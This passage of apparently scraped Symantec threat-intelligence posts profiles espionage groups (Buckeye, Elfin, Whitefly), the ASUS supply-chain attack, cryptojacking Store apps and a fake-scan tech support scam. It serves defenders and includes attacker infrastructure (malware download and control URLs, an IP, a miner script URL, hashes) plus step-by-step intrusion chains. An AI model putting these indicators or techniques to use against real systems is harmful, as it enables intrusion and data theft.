accounts to amplify its impact. The sheer scale and impact of this propaganda campaign is obviously of deep concern to voters in all countries, who may fear a repeat of what happened in the lead-up to the U.S. presidential election in 2016. A growing awareness of the disinformation campaigns may help blunt their impact in future.

    "link": "https://www.security.com/threat-intelligence/buckeye-windows-zero-day-exploit",
    "content": "The 2017 leak of Equation Group tools by a mysterious group calling itself the Shadow Brokers was one of the most significant cyber security stories in recent years. Equation isregarded as one of the most technically adept espionage groupsand the release of a trove of its tools had a major impact, with many attackers rushing to deploy the malware and exploits disclosed. One of these tools, the EternalBlue exploit, was used to devastating effect in theMay 2017 WannaCry ransomware outbreak. However, Symantec has now found evidence that the Buckeye cyber espionage group (aka APT3, Gothic Panda)began using Equation Group tools in attacks at least a year prior to the Shadow Brokers leak. Beginning in March 2016, Buckeye began using a variant of DoublePulsar (Backdoor.Doublepulsar), a backdoor that was subsequently released by the Shadow Brokers in 2017. DoublePulsar was delivered to victims using a custom exploit tool (Trojan.Bemstour) that was specifically designed to install DoublePulsar. Bemstour exploits two Windows vulnerabilities in order to achieve remote kernel code execution on targeted computers. One vulnerability is a Windows zero-day vulnerability (CVE-2019-0703) discovered by Symantec. The second Windows vulnerability (CVE-2017-0143) was patched in March 2017 after it was discovered to have been used by two exploit tools—EternalRomance and EternalSynergy—that were also released as part of the Shadow Brokers leak. The zero-day vulnerability allows for the leaking of information and can be exploited in conjunction with other vulnerabilities to attain remote kernel code execution. It was reported by Symantec to Microsoft in September 2018 andwas patched on March 12, 2019. How Buckeye obtained Equation Group tools at least a year prior to the Shadow Brokers leak remains unknown. Buckeye disappeared in mid-2017 and three alleged members of the group wereindicted in the U.S.in November 2017. However, while activity involving known Buckeye tools ceased in mid-2017, the Bemstour exploit tool and the DoublePulsar variant used by Buckeye continued to be used until at least September 2018 in conjunction with different malware. The Buckeye attack group had been active since at least 2009, when it began mounting a string of espionage attacks, mainly against organizations based in the U.S. The group has a record of exploiting zero-day vulnerabilities. These includeCVE-2010-3962as part of an attack campaign in 2010 andCVE-2014-1776in 2014. Although other zero-day attacks have been reported, they have not been confirmed by Symantec. All zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash. Beginning in August 2016, a group calling itself the Shadow Brokers began releasing tools it claimed to have originated from the Equation Group. It initially released samples of the information it had, offering the full trove to the highest bidder. Over the coming months, it progressively released more tools, until April 2017, when it released a final, large cache of tools, including the DoublePulsar backdoor, the FuzzBunch framework, and the EternalBlue, EternalSynergy, and EternalRomance exploit tools. However, Buckeye had already been using some of these leaked tools at least a year beforehand. The earliest known use of Equation Group tools by Buckeye is March 31, 2016, during an attack on a target in Hong Kong. During this attack, the Bemstour exploit tool was delivered to victims via known Buckeye malware (Backdoor.Pirpi). One hour later, Bemstour was used against an educational institution in Belgium. Bemstour is specifically designed to deliver a variant of the DoublePulsar backdoor. DoublePulsar is then used to inject a secondary payload, which runs in memory only. The secondary payload enables the attackers to access the affected computer even after DoublePulsar is removed. It is worth noting that earlier versions did not include any means of uninstalling the DoublePulsar implant. This functionality was added in later versions. A significantly improved variant of the Bemstour exploit tool was rolled out in September 2016, when it was used in an attack against an educational institution in Hong Kong. While the original variant was only capable of exploiting 32-bit systems, the new variant could exploit both 32-bit and 64-bit targets, adding support for newer Windows versions. Another new feature of the payload in the second variant allowed the attacker to execute arbitrary shell commands on the infected computer. This custom payload is also designed to copy arbitrary files and execute arbitrary processes on the targeted computer. When used against 32-bit targets, Bemstour still delivered the same DoublePulsar backdoor. However, against 64-bit targets it delivered only the custom payload. The attackers typically used it to execute shell commands that created new user accounts. Bemstour was used again in June 2017 in an attack against an organization in Luxembourg. Unlike earlier attacks when Bemstour was delivered using Buckeye’s Pirpi backdoor, in this attack Bemstour was delivered to the victim by a different backdoor Trojan (Backdoor.Filensfer). Between June and September 2017, Bemstour was also used against targets in the Philippines and Vietnam. Development of Bemstour has continued into 2019. The most recent sample of Bemstour seen by Symantec appears to have been compiled on March 23, 2019, eleven days after the zero-day vulnerability was patched by Microsoft. The purpose of all the attacks was to acquire a persistent presence on the victim’s network, meaning information theft was the most likely motive of the attacks. Filensfer is a family of malware that has been used in targeted attacks since at least 2013. Symantec has found multiple versions of the malware, including a C++ version, a compiled Python version (using py2exe), and a PowerShell version. Over the past three years, Filensfer has been deployed against organizations in Luxembourg, Sweden, Italy, the UK, and the U.S. Targets included organizations in the telecoms, media, and manufacturing sectors. While Symantec has never observed the use of Filensfer alongside any known Buckeye tools, information shared privately by another vendor included evidence of Filensfer being used in conjunction with known Buckeye malware (Backdoor.Pirpi). Bemstour exploits two Windows vulnerabilities in order to achieve remote kernel code execution on targeted computers. The zero-day vulnerability found and reported by Symantec (CVE-2019-0703) occurs due to the way the Windows SMB Server handles certain requests. The vulnerability allows for the leaking of information. The second vulnerability (CVE-2017-0143) is a message type confusion vulnerability. When the two vulnerabilities are exploited together, the attacker can gain full access in the form of kernel mode code execution, enabling them to deliver malware to the targeted computer. When Bemstour was first used in 2016, both vulnerabilities were zero days, although CVE-2017-0143 was subsequently patched by Microsoft in March 2017 (MS17-010). CVE-2017-0143 was also used by two other exploit tools—EternalRomance and EternalSynergy—that were released as part of the Shadow Brokers leak in April 2017. Buckeye's exploit tool, EternalRomance, as well as EternalSynergy, can exploit the CVE-2017-0143 message type confusion vulnerability to perform memory corruption on unpatched victim computers. In order to obtain remote code execution capabilities, all three exploit tools needed to collect information about the memory layout of attacked systems in addition to exploiting the aforementioned message type confusion vulnerability. Each tool performed this differently, relying on different vulnerabilities. In the case of the Buckeye exploit tool, the attackers exploited their own zero-day vulnerability (CVE-2019-0703). The variant of DoublePulsar used in the first attacks performed by Buckeye was different to that leaked by the Shadow Brokers. It appears to contain code to target newer versions of Windows (Windows 8.1 and Windows Server 2012 R2), indicating that it is a newer version of the malware. It also includes an additional layer of obfuscation. Based on technical features and timing, it is possible that this obfuscation was created by DoublePulsar's original authors. It is noteworthy that the attackers never used the FuzzBunch framework in its attacks. FuzzBunch is a framework designed to manage DoublePulsar and other Equation Group tools and was leaked by the Shadow Brokers in 2017. This suggests that Buckeye only managed to gain access to a limited number of Equation Group tools. There are multiple possibilities as to how Buckeye obtained Equation Group tools before the Shadow Brokers leak. Based on the timing of the attacks and the features of the tools and how they are constructed, one possibility is that Buckeye may have engineered its own version of the tools from artifacts found in captured network traffic, possibly from observing an Equation Group attack. Other less supported scenarios, given the technical evidence available, include Buckeye obtaining the tools by gaining access to an unsecured or poorly secured Equation Group server, or that a rogue Equation group member or associate leaked the tools to Buckeye. Mystery also surrounds the continued use of the exploit tool and DoublePulsar after Buckeye's apparent disappearance. It may suggest that Buckeye retooled following its exposure in 2017, abandoning all tools publicly associated with the group. However, aside from the continued use of the tools, Symantec has found no other evidence suggesting Buckeye has retooled. Another possibility is that Buckeye passed on some of its tools to an associated group. Symantec has the following protection in place to protect customers against these attacks: File-based protection Network-based protection (Intrusion Prevention System) In addition to file-based protection, customers of theDeepSight Intelligence Managed Adversary and Threat Intelligence(MATI) service have received reports on Buckeye, which detail methods of detecting and thwarting activities of this group.

    "title": "elfin apt33 espionage",
    "link": "https://www.security.com/threat-intelligence/elfin-apt33-espionage",
    "content": "The Elfin espionage group (aka APT33) has remained highly active over the past three years, attacking at least 50 organizations in Saudi Arabia, the United States, and a range of other countries. The group, which first became active in late 2015 or early 2016, specializes in scanning for vulnerable websites and using this to identify potential targets, either for attacks or creation of command and control (C&C) infrastructure. It has compromised a wide range of targets, including governments along with organizations in the research, chemical, engineering, manufacturing, consulting, finance, telecoms, and several other sectors. Elfin continues to be focused heavily on Saudi Arabia, which accounted for 42 percent of attacks observed by Symantec since the beginning of 2016. However, the U.S. has also been a country of significant interest to the group, with 18 organizations attacked over the past three years, including a number of Fortune 500 companies. Elfin targets in the U.S. have included organizations in the engineering, chemical, research, energy consultancy, finance, IT, and healthcare sectors. Some of these U.S. organizations may have been targeted by Elfin for the purpose of mounting supply chain attacks. In one instance, a large U.S. company was attacked in the same month a Middle Eastern company it co-owns was also compromised. In a recent wave of attacks during February 2019, Elfin attempted to exploit a known vulnerability (CVE-2018-20250) in WinRAR, the widely used file archiving and compression utility capable of creating self-extracting archive files. The exploit was used against one target in the chemical sector in Saudi Arabia. If successfully exploited on an unpatched computer, the vulnerability could permit an attacker to install any file on the computer, which effectively permits code execution on the targeted computer. Two users in the targeted organization received a file called \"JobDetails.rar\", which attempted to exploit the WinRAR vulnerability. This file was likely delivered via a spear-phishing email. However, prior to this attempted attack, Symantec had rolled out proactive protection against any attempt to exploit this vulnerability (Exp.CVE-2018-20250). This protection successfully protected the targeted organization from being compromised. Elfin came under the spotlight in December 2018 when it was linked with a new wave of Shamoon attacks. One Shamoon victim in Saudi Arabia had recently also been attacked by Elfin and had been infected with the Stonedrill malware (Trojan.Stonedrill) used by Elfin. Because the Elfin and the Shamoon attacks against this organization occurred so close together, there has been speculation that the two groups may be linked. However, Symantec has found no further evidence to suggest Elfin was responsible for these Shamoon attacks to date.  We continue to monitor the activities of both groups closely. Elfin has deployed a wide range of tools in its attacks including custom malware, commodity malware, and open-source hacking tools. Custom malware used by the group include: In addition to its custom malware, Elfin has also used a number of commodity malware tools, available for purchase on the cyber underground. These include: Elfin also makes frequent use of a number of publicly available hacking tools, including: In this section, we describe in detail an Elfin attack on a U.S. organization. On February 12, 2018 at 16:45 (all times are in the organization’s local time), an email was sent to the organization advertising a job vacancy at an American global service provider. The email contained a malicious link to hxxp://mynetwork.ddns[DOT].net:880. The recipient clicked the link and proceeded to download and open a malicious HTML executable file, which in turn loaded content from a C&C server via an embedded iframe. At the same time, code embedded within this file also executed a PowerShell command to download and execute a copy of chfeeds.vbe from the C&C server. A second JavaScript command was also executed, which created a scheduled task to execute chfeeds.vbe multiple times a day. The chfeeds.vbe file acts as a downloader and was used to download a second PowerShell script (registry.ps1). This script in turn downloaded and executed a PowerShell backdoor known as POSHC2, a proxy-aware C&C framework, from the C&C server (hxxps:// host-manager.hopto.org). Later at 20:57, the attackers became active on the compromised machine and proceeded to download the archiving tool WinRAR. At 23:29, the attackers then proceeded to deploy an updated version of their POSHC2 stager. This tool was downloaded several times between 23:29 on February 12 and 07:47 on February 13. Two days later, on February 14 at 15:12, the attackers returned and installed Quasar RAT onto the infected computer that communicated with a C&C server (217.147.168.123). Quasar RAT was installed to CSIDL_PROFILE\\appdata\\roaming\\microsoft\\crypto\\smss.exe. At this point, the attackers ceased activity while maintaining access to the network until February 21. At 06:38, the attackers were observed downloading a custom .NET FTP tool to the infected computer. Later at 6:56, the attackers exfiltrated data using this FTP tool to a remote host: Activity ceased until the attackers returned on March 5 and were observed using Quasar RAT to download a second custom AutoIt FTP exfiltration tool known as FastUploader from hxxp://192.119.15[DOT]36:880/ftp.exe. This tool was then installed to csidl_profile\\appdata\\roaming\\adobe\\ftp.exe. FastUploader is a custom FTP tool designed to exfiltrate data at a faster rate than traditional FTP clients. At this point, additional activity from the attackers continued between March 5 into April, and on April 18 at 11:50, a second remote access tool known as DarkComet was deployed to csidl_profile\\appdata\\roaming\\microsoft\\windows\\start menu\\programs\\startup\\smss.exe on the infected computer. This was quickly followed 15 seconds later by the installation of a credential dumping to csidl_profile\\appdata\\roaming\\microsoft\\credentials\\dwm32.exe, and the execution of PowerShell commands via PowerShell Empire, a freely available post-exploitation framework, to bypass logging on the infected machine. Activity continued throughout April where additional versions of DarkComet, POSHC2 implants, and an AutoIt backdoor were deployed along with further credential dumping activities. Elfin is one of the most active groups currently operating in the Middle East, targeting a large number of organizations across a diverse range of sectors. Over the past three years, the group has utilized a wide array of tools against its victims, ranging from custom built malware to off-the-shelf RATs, indicating a willingness to continually revise its tactics and find whatever tools it takes to compromise its next set of victims. Symantec has the following protection in place to protect customers against these attacks: File-based protection In addition to file-based protection, customers of theDeepSight Intelligence Managed Adversary and Threat Intelligence(MATI) service have received reports on Elfin, which detail methods of detecting and thwarting activities of this group.

    "content": "News has emerged that tech company ASUS has been delivering malware through its automated software update system. Based on our analysis, this supply chain attack started in June 2018 and continued through to at least late October. It may have affected up to half a million systems. The Trojanized updates contained a form of backdoor program which attempted to connect to an attacker-controlled domain. The updates were signed with legitimate ASUS digital certificates. Symantec detects the Trojanized updates asTrojan.Susafone,Trojan.Susafone!gen1,Trojan.Susafone!gen2, andTrojan.Susafone!gen3. What happens when the Trojanized updates are installed? The Trojanized updates search for specific machines based on their unique MAC addresses. If specific MAC addresses are found, the installed updates attempt to connect to asushotfix[.]com. This domain is currently offline. How many victims are there? Symantec telemetry shows that at least 13,000 computers received the Trojanized updates. 80 percent of victims were consumers and 20 percent were from organizations. Our telemetry shows an even spread of victims across the globe. What is the motivation behind the attack? The attacker motivation is unclear at this time. Who are the attackers behind this attack? This is unknown at this time. What is a supply chain attack? Supply chain attacks attempt to exploit third-party services and software to compromise a final target. Hijacked software updates are one of the most common forms of supply chain attack. Similar campaigns in the past include the CCleaner attacks and the Petya campaign. Symantec noted in itslatest ISTR reporthow supply chain attacks increased by 78 percent in 2018. Thanks to Kaspersky for sharing details related to these attacks. Symantec's Security Response organization develops and deploys new security content to Symantec customers. Our team of global threat analysts operate 24x7 to track developments on the threat landscape and protect Symantec customers.

    "content": "There are various steps that an attacker must follow in order to execute any successful attack, with the initial compromise being just one stage in the overall attack chain. Once attackers have successfully breached the perimeter of an organization, they enter into the lateral movement phase where they attempt to tiptoe through a network, identifying the systems and data that are the ultimate target of their campaign. Credential dumping is a technique frequently used by attackers during lateral movement to obtain account information, such as logins and passwords. Armed with this information, the attackers can then spread further within an organization and/or access restricted data. Attackers use a variety of different credential-dumping methods that require first obtaining administrator privileges. This process is known as privilege escalation and it must be performed before any attempts at credential dumping. Detecting and blocking lateral movement activity is an important part of any organization's defense strategy and our Symantec portfolio provides defense-in-depth across control points. Our solutions detect and prevent credential dumping, and also protect against precursor events such as threat delivery and privilege escalation, as well as post-theft credential use. Credential dumping has long been used as a step in post-breach lateral movement and is listed asT1003 in the MITRE ATT&CK™ Framework. One of the challenges in protecting against all forms of credential dumping is that attackers attempt to masquerade their methods as legitimate activity, sometimes leveraging standard administrative tools to achieve the dumping. There are also easily available tools online, such asHacktool.Mimikatz, which use a variety of methods to dump credentials. Attempts at credential dumping can be uncovered in a variety of ways by our Symantec solutions. Here, I will discuss how our Symantec Endpoint Detection and Response (SEDR) product provides visibility into attempted credential theft by identifying a wide range of credential-dumping techniques, including: When any suspected credential theft is found, regardless of the specific tool used to access the credentials, SEDR reports exactly what was observed along with the relevant MITRE ATT&CK tactic (the attacker's goal) and technique (how the attacker was trying to achieve that goal): Symantec EDR will automatically pull in related activity to the credential dumping detection, in order to provide more context around the breach. SEDR leverages our Targeted Attack Analytics (TAA) technology, which combines the capabilities of our world-leading security experts with advanced artificial intelligence and machine learning to provide organizations with their own \"virtual analysts\". TAA correlates local events within an organization with information from Symantec’s massive global security telemetry data store to build out the full picture of attacker movement in the organization. Since its inception, TAA has detected security incidents at thousands of organizations, automating what would have taken many hours of analyst time. Examples of additional events that TAA can correlate to attempted credential dumping include: In addition to the detection provided by SEDR, Symantec Endpoint Protection (SEP) uses a variety of technologies to block credential-dumping techniques, including: Alerts from these technologies are displayed in SEP as: Symantec Endpoint Protection and Symantec Endpoint Detection and Response are just two offerings across Symantec's defense-in-depth portfolio that can help identify and block credential theft at various points in the attack chain. Our threat research teams continue to identify new credential dumping techniques being used in both targeted attacks as well ascyber crimeactivity. We look forward to sharing more both about the evolution of these attacks and about how Symantec's broad portfolio protects our customers against them.

    "title": "whitefly espionage singapore",
    "link": "https://www.security.com/threat-intelligence/whitefly-espionage-singapore",
    "content": "In July 2018, an attack on Singapore’s largest public health organization, SingHealth, resulted in a reported 1.5 million patient records being stolen. Until now, nothing was known about who was responsible for this attack. Symantec researchers have discovered that this attack group, which we call Whitefly, has been operating since at least 2017, has targeted organizations based mostly in Singapore across a wide variety of sectors, and is primarily interested in stealing large amounts of sensitive information. Whitefly compromises its victims using custom malware alongside open-source hacking tools and living off the land tactics, such as malicious PowerShell scripts. From mid-2017 to mid-2018, Whitefly launched targeted attacks against multiple organizations. While most of these organizations were based in Singapore, some were multinational organizations with a presence in Singapore. To date, Whitefly has attacked organizations in the healthcare, media, telecommunications, and engineering sectors. Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image. These files frequently purport to offer information on job openings or appear to be documents sent from another organization operating in the same industry as the victim. Given the nature of disguise, it’s highly likely that they are sent to the victim using spear-phishing emails. If opened, the dropper runs a loader known asTrojan.Vcrodaton the computer. Whitefly has consistently used a technique known as search order hijacking to run Vcrodat. This technique takes advantage of the fact that Windows does not require an application to provide a specific path for a DLL that it wishes to load. If no path is provided, Windows searches for the DLL in specific locations on the computer in a pre-defined order. Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it. Whitefly frequently delivers Vcrodat as a malicious DLL that has the same name as DLLs belonging to legitimate software from various security vendors. The group leverages search order hijacking to assure that its malicious DLLs will be executed. Targeting security applications could allow the attackers to gain higher privileges for the malware, since the vendor’s component may be run with elevated privileges. Once executed, Vcrodat loads an encrypted payload on to the victim’s computer. The payload contacts a command and control (C&C) domain. Whitefly configures multiple C&C domains for each target. The payload sends system information about the infected computer to the C&C server and downloads additional tools. Whitefly usually attempts to remain within a targeted organization for long periods of time—often months—in order to steal large volumes of information. Once the initial computer on the targeted organization’s network is infected with Vcrodat, Whitefly begins mapping the network and infecting further computers. In order to carry out this operation, it uses publicly available tools, including Mimikatz (Hacktool.Mimikatz) and an open-source tool (SHA2: 263dc5a8121d20403beeeea452b6f33d51d41c6842d9d19919def1f1cb13226c) that exploits a known Windows privilege escalation vulnerability (CVE-2016-0051) on unpatched computers. The attackers rely heavily on tools such as Mimikatz to obtain credentials. Using these credentials, the attackers are able to compromise more machines on the network and, from those machines, again obtain more credentials.  They perform this tactic repeatedly until they gain access to the desired data. Whitefly usually attempts to remain within a targeted organization for long periods of time—often months—in order to steal large volumes of information. It keeps the compromise alive by deploying a number of tools that facilitate communication between the attackers and infected computers. These tools include a simple remote shell tool that will call back to the C&C server and wait for commands, and an open-source hacking tool called Termite (Hacktool.Rootkit), which allows Whitefly to perform more complex actions such as controlling multiple compromised machines at a time. In some attacks, Whitefly has used a second piece of custom malware,Trojan.Nibatad. Like Vcrodat, Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer. And similar to Vcrodat, the Nibatad payload is designed to facilitate information theft from an infected computer. While Vcrodat is delivered via the malicious dropper, we have yet to discover how Nibatad is delivered to the infected computer. Why Whitefly uses these two different loaders in some of its attacks remains unknown. And while we have found both Vcrodat and Nibatad inside individual victim organizations, we have not found any evidence of them being used simultaneously on a single computer. Some of the tools that Whitefly has used in its attacks have also been deployed in other targeted attacks outside Singapore. Between May 2017 and December 2018, a multi-purpose command tool (SHA2: 7de8b8b314f2d2fb54f8f8ad4bba435e8fc58b894b1680e5028c90c0a524ccd9) that has been used by Whitefly was also used in attacks against defense, telecoms, and energy targets in Southeast Asia and Russia. The tool appears to be custom-built and, aside from its use by Whitefly, these were the only other attacks where Symantec has observed its use. In another case, Vcrodat was also used in an attack on a UK-based organization in the hospitality sector. It's possible Whitefly itself performed these attacks but it’s more likely that they were carried out by one or more other groups with access to the same tools. It now appears that the SingHealth breach was not a one-off attack and was instead part of a wider pattern of attacks against organizations in the region. Whitefly is a highly adept group with a large arsenal of tools at its disposal, capable of penetrating targeted organizations and maintaining a long-term presence on their networks. Links with attacks in other regions also present the possibility that it may be part of a broader intelligence gathering operation. Symantec has the following protection in place to protect customers against these attacks: File-based protection The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks.

    "content": "Like flies to honey, miscreants are drawn to the latestcyber crimethat promises quick bucks with minimal effort. Ransomware and cryptojacking have had their day in the sun with the get-rich-quick criminals, and now it’s formjacking’s turn. In this year’sInternet Security Threat Report (ISTR) Volume 24, we share the latest insights into global threat activity, cyber criminal trends, and attacker motivations. This year's report notably reveals formjacking—where infected web servers skim off consumers' payment information—has emerged as the breakthrough threat of 2018. This threat showed explosive growth—and potentially big profits—at the end of the year, ensuring that it's likely to draw plenty of flies in 2019 and beyond. Often using third-party apps to infiltrate websites, formjacking also further illustrates the dangers of supply chain attacks, a growing weakness we first warned of in last year's report. Requiring only a few simple lines of code loaded onto a website, formjacking represents a significant threat to online retailers, or anyone who collects personally identifiable information from their customers via their website. This year's report notably reveals formjacking—where infected web servers skim off consumers’ payment information—has emerged as the breakthrough threat of 2018. While no longer easy money, ransomware and cryptojacking have not gone away. The ISTR shows that with the decline in the value of cryptocurrencies, getting rich quickly through cryptojacking isn't as easy as before, and some attackers have moved on to more lucrative activities. But attacks are easy to instigate and manage, meaning those criminals playing the long game can still make money. Overall, Symantec blocked four times as many cryptojacking attacks last year than in 2017, and it continues to persist as an active threat so far this year. Ransomware still offers the opportunity to make large sums of money. The SamSam gang is estimated to have made $6 million from their ransomware attacks. In fact, ransomware actors are increasingly narrowing in on enterprises, a high-value target. Ransomware infections grew in enterprise environments by 12 percent, while consumer infections declined. Consumers likely benefited due to their growing use of mobile devices, as criminals favor Office email attachments and PowerShell scripts—which don't work as well on mobile devices—to carry out ransomware attacks. Yet the threat landscape is not just about crime and the quest for cash. Nation-states quickly adopted the internet for espionage and have used it for destructive purposes. Late last year,Shamoon notably reemerged after a two-year absence, deploying wiping malware to delete files on computers of targeted organizations in the Middle East. Nearly one in ten targeted attack groups now use malware to destroy and disrupt business operations, a 25 percent increase from the previous year. They also continue to refine their attack techniques, favoring spear phishing over zero days and using living off the land techniques to maintain a low profile and hide their attacks in a sea of legitimate IT processes. Nearly one in ten targeted attack groups now use malware to destroy and disrupt business operations, a 25 percent increase from the previous year. In fact, Symantec'sTargeted Attack Analytics (TAA)technology discovered an attack group calledGallmakerin 2018 that needed no malware at all to infiltrate its targets. As attackers continue to use our own tools against us, detection must evolve from identifying malware to determining intent. Solutions based on machine learning and advanced artificial intelligence, like TAA, are increasingly critical for detecting attacks. It seems that no one would willingly carry on their person a device that would allow someone to spy on their every thought, conversation, and movement. But the headlines of today indicate that we do. That device is our smartphone, and it's not just spymasters seeking out information about us. Even legitimate applications are spying on us. To help understand the risks involved, Symantecanalyzed the top 100 Android and iOS applicationsin 2018 and found nearly half of Android apps and one-quarter of iOS apps requested location tracking. Apps asked for phone numbers, email addresses, access to cameras, microphones, photos, and any personal data stored on the device. That these applications want information about us—far beyond the needs of the application itself—is clear. What to do about it is not as clear, but it starts with understanding the extent of the problem. No blog can sufficiently cover the threat landscape, but the ISTR can.

    "title": "cryptojacking apps microsoft store",
    "link": "https://www.security.com/threat-intelligence/cryptojacking-apps-microsoft-store",
    "content": "On January 17, we discovered several potentially unwanted applications (PUAs) on the Microsoft Store that surreptitiously use the victim’s CPU power to mine cryptocurrency. We reported these apps to Microsoft and they subsequently removed them from their store. The apps—which included those for computer and battery optimization tutorial, internet search, web browsers, and video viewing and download—came from three developers: DigiDream, 1clean, and Findoo. In total, we discovered eight apps from these developers that shared the same risky behavior. After further investigation, we believe that all these apps were likely developed by the same person or group. Users may get introduced to these apps through the top free apps lists on the Microsoft Store or through keyword search. The samples we found run on Windows 10, including Windows 10 S Mode. As soon as the apps are downloaded and launched, they fetch a coin-mining JavaScript library by triggering Google Tag Manager (GTM) in their domain servers. The mining script then gets activated and begins using the majority of the computer’s CPU cycles to mine Monero for the operators. Although these apps appear to provide privacy policies, there is no mention of coin mining on their descriptions on the app store. The apps were published between April and December 2018, with most of them published toward the end of the year. Even though the apps were on the app store for a relatively short period of time, a significant number of users may have downloaded them. Although we can’t get exact download or installation counts, we can see that there were almost 1,900 ratings posted for these apps. However, app ratings can be fraudulently inflated, so it is difficult to know how many users really downloaded these apps. These apps’ domains are hardcoded in their app manifest file, as shown in Figure 2. When each app is launched, the domain is silently visited in the background and triggers GTM with the key GTM-PRFLJPX, which is shared across all eight applications. GTM is a legitimate tool that allows developers to inject JavaScript dynamically into their applications. However, GTM can be abused to conceal malicious or risky behaviors, since the link to the JavaScript stored in GTM ishttps://www.googletagmanager.com/gtm.js?id={GTM ID}which doesn’t indicate the function of the code invoked. By monitoring the network traffic from these apps, we found that they all connect to the following remote location, which is a coin-mining JavaScript library:http://statdynamic.com/lib/crypta.js The apps then access their own GTM and activate the mining script. Crypta.js is an encrypted JavaScript library, as shown in Figure 4. After we decoded it, we found that it was a version of the Coinhive library. Coinhive is a script that mines Monero. Since the Coinhive service was launched in September 2017, there have been many reports of it being used for cryptojacking without site visitors' knowledge. We also investigated the miner activation code on GTM, and the key source code is shown in Figure 5. We observed that the miner crawls with the keyda8c1ffb984d0c24acc5f8b966d6f218fc3ca6bda661, which serves as the wallet for Coinhive. These apps fall under the category of Progressive Web Applications, which are installed as a Windows 10 app running independently from the browser, in a standalone (WWAHost.exe process) window. From the apps’ network traffic, we found the hosting server for each app. Through a Whois query, we found that all of these servers actually have the same origin. Therefore, these apps were most likely published by the same developers using different names. We have informed Microsoft and Google about these apps’ behaviors. Microsoft has removed the apps from their store. The mining JavaScript has also been removed from Google Tag Manager. Stay protected from online threats and risks by taking these precautions: Symantec and Norton products detect the apps and the JavaScript cryptocurrency miner, respectively, as the following: Join us for a digital news event to hear how Symantec and our partners are working together to drive down the cost and complexity of cyber security, while protecting enterprises against sophisticated threats.

    "content": "Tech support scams continue to prey on unwitting victims. We have seen in recent months how these scams are constantly evolving, from the use ofcall optimizationto the use ofAdvanced Encryption Standard(AES) and amulti-level obfuscation scheme. Tech support scammers' modus operandi is to get the victim to believe that their computer has been infected with malware, and that their only recourse is to call a technical support number for assistance on cleaning the system. Once on the call, a purported support executive would ask the victim for remote access to their computer and then charge a fee for the supposed cleaning they did. While scammers' playbooks remain more or less the same, we have recently seen how scammers are now tricking victims into installing a potentially unwanted application (PUA), rather than urging them to call a support helpline. Toward the end of 2018, we observed a tech support scam campaign that displays a fake Windows alert, warning the victim that their computer might be infected. The scam prompts the victim to approve a supposedly quick 10-second scan of their computer. Once the user clicks OK, the scammers pull off a highly convincing but fake system scan that is almost identical to Norton Security's. We will provide details on how exactly the scammers pull this off later in this blog. At the end of the fake scan, the victim is informed that their PC is indeed infected and then asked to download and install an update to their antivirus software. Upon clicking Proceed, a potentially unwanted application (PUA) is downloaded and installed onto the victim's computer. Just like most tech support scams, this one typically begins after the user visits a malicious website, or is redirected to one through malvertising or a compromised website. We went through the scam's source code to see how this fake scan trickery was achieved. The code contains HTML div elements with the display property set to \"none\", as shown in Figure 3. This setting of display property ensures that the div element is not visible to the victim as soon as the page loads. Moving forward, we see JavaScript code, as shown in Figure 4. The setTimeout() method calls a function or evaluates an expression after a specified number of milliseconds. When the script shown in Figure 4 starts executing, it will first change the display style of the div to \"block\" after two seconds, thereby making the div visible to the victim. The scammer progressively increases the time period for the subsequent calls to the setTimeout() function. This makes the \"windows\" appear on top of each other, one after the other, on the front end. Thus, the victim first sees the start of the scan process, followed by the intermediate in-progress scan graphics, and finally the graphic box, which displays that the system is infected. In Figure 4, we can see some values being assigned to different HTML elements via JavaScript. For example, the element \"cnt1\" is being assigned a value of 218, \"path1\" is assigned a value of \"C:\\Windows\\System32\\sihost.exe\", and so on. These are the values for the number of files scanned and the current file being scanned as it appears on the front end. The scammer cleverly makes use of the setTimeout() function to change these values over a period of time, giving the victim the illusion that an actual scan is in progress and that their files are being scanned. The scammer cleverly makes use of the setTimeout() function to change values over a period of time, giving the victim the illusion that an actual scan is in progress and that their files are being scanned. In this scam, the scammer does not force the victim to call a support helpline, but rather tricks the victim into downloading a PUA. Typically, a PUA comes bundled with other intended software and gets installed along with the intended software. PUAs have been known to perform the following actions on the computer: In a typical tech support scam revenue-generation model, the scammer is dependent on the victim calling the support helpline to earn revenue. However, in this case, we have observed that the malicious code keeps track of the number of victims who are tricked into installing the PUA. In this scenario, the scammer earns revenue by maximizing the number of PUA installs. Digging into our telemetry, we located an unsecured attacker dashboard, which shows the revenue distribution for this model. In Figure 6, we can clearly see the number of clicks generated by each traffic source and the corresponding returns on investment (ROI) from these sources. This model is similar to that used in the exploit kit (EK) space, where malware authors use EKs as a mechanism to deliver their malware to more and more victims and thereby maximize their profit. In the past few weeks, we have also seen similar tech support scams that follow the PUA revenue-generation model. One such scam tricks the victim into believing that their Windows drivers are not updated and asks them to download and install the \"latest drivers\", which are actually PUAs. If this new model proves more profitable than the helpline route down the road, we are likely to see its adoption increase among scammers. Know what's real from fake. Even though the \"Norton\" scan looks almost indistinguishable from the real one, there are many attributes that easily indicate it is fake: Symantec proactively protects customers against tech support scams. Our intrusion prevention system (IPS) technology protects customers by blocking malicious network activity associated with such scams using a wide variety of detections. In the last quarter of 2018, Symantec's IPS blocked more than 89 million tech support scams. Norton Security,Symantec Endpoint Protection, and many otherSymantec security productshave comprehensive network-based protection features such as firewall and IPS built in. To protect yourself from these types of scams, ensure that these features are enabled. Also, make sure to visit only legitimate websites when you need support for any product. Last but not least, make sure your security product is updated regularly. More information on tech support scams can be foundhere.

    "title": "african financial attacks",
    "link": "https://www.security.com/threat-intelligence/african-financial-attacks",
